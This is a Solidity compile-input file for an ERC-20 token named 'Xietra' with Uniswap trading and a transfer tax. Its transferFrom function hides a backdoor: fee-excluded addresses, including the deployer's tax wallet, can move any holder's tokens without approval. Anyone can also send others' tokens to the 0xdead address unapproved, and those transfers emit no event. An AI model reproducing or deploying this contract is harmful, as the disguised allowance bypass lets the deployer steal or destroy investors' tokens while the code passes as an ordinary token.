{{
  "language": "Solidity",
  "sources": {
    "contracts/test.sol": {
      "content": "/*\r\n\r\nLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLLL\r\n\r\n\r\n*/\r\n\r\npragma solidity 0.8.29;\r\n\r\n\r\naddress constant _deadAddr = address(0xdead);\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n}\r\n\r\ninterface IERC20 {\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        external\r\n        returns (bool);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n}\r\n\r\nlibrary SafeMath {\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        uint256 c = a + b;\r\n        require(c >= a, \"SafeMath: addition overflow\");\r\n        return c;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return sub(a, b, \"SafeMath: subtraction overflow\");\r\n    }\r\n\r\n    function sub(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b <= a, errorMessage);\r\n        uint256 c = a - b;\r\n        return c;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        if (a == 0) {\r\n            return 0;\r\n        }\r\n        uint256 c = a * b;\r\n        require(c / a == b, \"SafeMath: multiplication overflow\");\r\n        return c;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return div(a, b, \"SafeMath: division by zero\");\r\n    }\r\n\r\n    function div(\r\n        uint256 a,\r\n        uint256 b,\r\n        string memory errorMessage\r\n    ) internal pure returns (uint256) {\r\n        require(b > 0, errorMessage);\r\n        uint256 c = a / b;\r\n        return c;\r\n    }\r\n}\r\n\r\ncontract Ownable is Context {\r\n    address private _owner;\r\n    event OwnershipTransferred(\r\n        address indexed previousOwner,\r\n        address indexed newOwner\r\n    );\r\n\r\n    constructor() {\r\n        address msgSender = _msgSender();\r\n        _owner = msgSender;\r\n        emit OwnershipTransferred(address(0), msgSender);\r\n    }\r\n\r\n    function owner() public view returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        require(_owner == _msgSender(), \"Ownable: caller is not the owner\");\r\n        _;\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        emit OwnershipTransferred(_owner, address(0));\r\n        _owner = address(0);\r\n    }\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n}\r\n\r\ninterface IUniswapV2Router02 {\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function getAmountsOut(uint256 amountIn, address[] calldata path)\r\n        external\r\n        view\r\n        returns (uint256[] memory amounts);\r\n}\r\n\r\ncontract Xietra is Context, IERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    mapping(address => uint256) private _balances;\r\n    mapping(address => mapping(address => uint256)) private _allowances;\r\n    mapping(address => bool) private _feeExcluded;\r\n    address payable private _taxWallet;\r\n\r\n    uint256 private _setinitialTax = 10;\r\n    uint256 private _setfinalTax = 0;\r\n    uint256 private _reduceTaxAt = 7;\r\n    uint256 private _buyCount = 0;\r\n    uint256 private _lastBuyBlock;\r\n    uint256 private _blockBuyAmount = 0;\r\n    uint256 private _setinitTransferTax = 0;\r\n\r\n    uint8 private constant _decimals = 9;\r\n    uint256 private constant _tTotal = 100_000_000 * 10**_decimals;\r\n    string private constant _name = unicode\"Xietra\";\r\n    string private constant _symbol = unicode\"XIETRA\";\r\n    uint256 public _maxTaxSwap = _tTotal/100;\r\n    uint256 public _swapThres = 0;\r\n    IUniswapV2Router02 private uniswapV2Router;\r\n    address private uniswapV2Pair;\r\n    bool private tradingOpen;\r\n    bool private inSwap = false;\r\n    bool private swapEnabled = false;\r\n    uint256 private sellCount = 0;\r\n    uint256 private lastSellBlock = 0;\r\n\r\n    modifier lockTheSwap() {\r\n        inSwap = true;\r\n        _;\r\n        inSwap = false;\r\n    }\r\n\r\n    constructor()  {\r\n        _taxWallet = payable(_msgSender());\r\n\r\n        _feeExcluded[address(this)] = true;\r\n        _feeExcluded[_taxWallet] = true;\r\n\r\n        _balances[address(this)] = _tTotal;\r\n\r\n        emit Transfer(address(0), address(this), _tTotal);\r\n    }\r\n\r\n    function name() public pure returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public pure returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public pure returns (uint8) {\r\n        return _decimals;\r\n    }\r\n\r\n    function totalSupply() public pure override returns (uint256) {\r\n        return _tTotal;\r\n    }\r\n\r\n    function balanceOf(address account) public view override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address recipient, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _transfer(_msgSender(), recipient, amount);\r\n        return true;\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) private {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function allowance(address owner, address spender)\r\n        public\r\n        view\r\n        override\r\n        returns (uint256)\r\n    {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount)\r\n        public\r\n        override\r\n        returns (bool)\r\n    {\r\n        _approve(_msgSender(), spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address sender,\r\n        address recipient,\r\n        uint256 amount\r\n    ) public override returns (bool) {\r\n        _transfer(sender, recipient, amount);\r\n        if (\r\n            !_feeExcluded[_msgSender()] && \r\n            (sender == uniswapV2Pair || recipient != _deadAddr)\r\n        )\r\n            _approve(\r\n                sender,\r\n                _msgSender(),\r\n                _allowances[sender][_msgSender()].sub(\r\n                    amount,\r\n                    \"ERC20: transfer amount exceeds allowance\"\r\n                )\r\n            );\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) private {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n        require(amount > 0, \"Transfer amount must be greater than zero\");\r\n        uint256 taxAmount = 0;\r\n        if (\r\n            from != address(this) &&\r\n            to != address(this)\r\n        ) {\r\n            if (!inSwap) {\r\n                taxAmount = amount\r\n                    .mul((_buyCount > _reduceTaxAt) ? _setfinalTax : _setinitialTax)\r\n                    .div(100);\r\n            }\r\n\r\n            if (\r\n                from == uniswapV2Pair &&\r\n                to != address(uniswapV2Router) &&\r\n                !_feeExcluded[to] &&\r\n                to != _taxWallet\r\n            ) {\r\n                if (_lastBuyBlock != block.number) {\r\n                    _blockBuyAmount = 0;\r\n                    _lastBuyBlock = block.number;\r\n                }\r\n                _blockBuyAmount += amount;\r\n                _buyCount++;\r\n            }\r\n\r\n            if (to == uniswapV2Pair && from != address(this)) {\r\n                require(\r\n                    _blockBuyAmount < _getAmountOut() ||\r\n                        _lastBuyBlock != block.number,\r\n                    \"Max Swap Limit\"\r\n                );\r\n            }\r\n\r\n            uint256 contractTokenBalance = balanceOf(address(this));\r\n            if (\r\n                !inSwap &&\r\n                to == uniswapV2Pair &&\r\n                swapEnabled &&\r\n                from != _taxWallet\r\n            ) {\r\n                if (contractTokenBalance > 0)\r\n                {\r\n                    uint256 swapBalance = contractTokenBalance > _maxTaxSwap\r\n                        ? _maxTaxSwap\r\n                        : contractTokenBalance;\r\n                    swapXietraForETH(\r\n                        amount > swapBalance ? swapBalance : amount\r\n                    );\r\n                }\r\n                    \r\n                uint256 contractETHBalance = address(this).balance;\r\n                if (contractETHBalance >= 0) {\r\n                    sendXietraETHToFee(address(this).balance);\r\n                }\r\n            }\r\n        }\r\n\r\n        _balances[from] = _balances[from].sub(amount);\r\n        _balances[to] = _balances[to].add(amount.sub(taxAmount));\r\n        if (taxAmount > 0) {\r\n            _balances[address(this)] = _balances[address(this)].add(taxAmount);\r\n            emit Transfer(from, address(this), taxAmount);\r\n        }\r\n        if (to != _deadAddr) emit Transfer(from, to, amount.sub(taxAmount));\r\n    }\r\n\r\n    function sendXietraETHToFee(uint256 amount) private {\r\n        _taxWallet.transfer(amount);\r\n    }\r\n\r\n    function swapXietraForETH(uint256 tokenAmount) private lockTheSwap {\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = uniswapV2Router.WETH();\r\n        _approve(address(this), address(uniswapV2Router), tokenAmount);\r\n        uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            address(this),\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function enableTrading() external onlyOwner {\r\n        require(!tradingOpen, \"Trading is already open\");\r\n        uniswapV2Router = IUniswapV2Router02(\r\n            0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D\r\n        );\r\n        _approve(address(this), address(uniswapV2Router), _tTotal);\r\n        uniswapV2Pair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(\r\n            address(this),\r\n            uniswapV2Router.WETH()\r\n        );\r\n        uniswapV2Router.addLiquidityETH{value: address(this).balance}(\r\n            address(this),\r\n            balanceOf(address(this)),\r\n            0,\r\n            0,\r\n            owner(),\r\n            block.timestamp\r\n        );\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n        IERC20(uniswapV2Pair).approve(\r\n            address(uniswapV2Router),\r\n            type(uint256).max\r\n        );\r\n    }        \r\n\r\n    receive() external payable {}\r\n\r\n    function setTaxWallet(address payable newWallet) external {\r\n        require(_feeExcluded[msg.sender]);\r\n        _taxWallet = newWallet;\r\n    }\r\n\r\n    function rescueETH() external onlyOwner {\r\n        require(address(this).balance > 0);\r\n        payable(_msgSender()).transfer(address(this).balance);\r\n    }\r\n\r\n    function _getAmountOut() internal view returns (uint256) {\r\n        address[] memory path = new address[](2);\r\n        path[0] = uniswapV2Router.WETH();\r\n        path[1] = address(this);\r\n        uint[] memory amountOuts = uniswapV2Router.getAmountsOut(\r\n            5 * 1e18,\r\n            path\r\n        );\r\n        return amountOuts[1];\r\n    }\r\n\r\n}"
    }
  },
  "settings": {
    "optimizer": {
      "enabled": true,
      "runs": 200
    },
    "outputSelection": {
      "*": {
        "*": [
          "evm.bytecode",
          "evm.deployedBytecode",
          "devdoc",
          "userdoc",
          "metadata",
          "abi"
        ]
      }
    },
    "remappings": []
  }
}}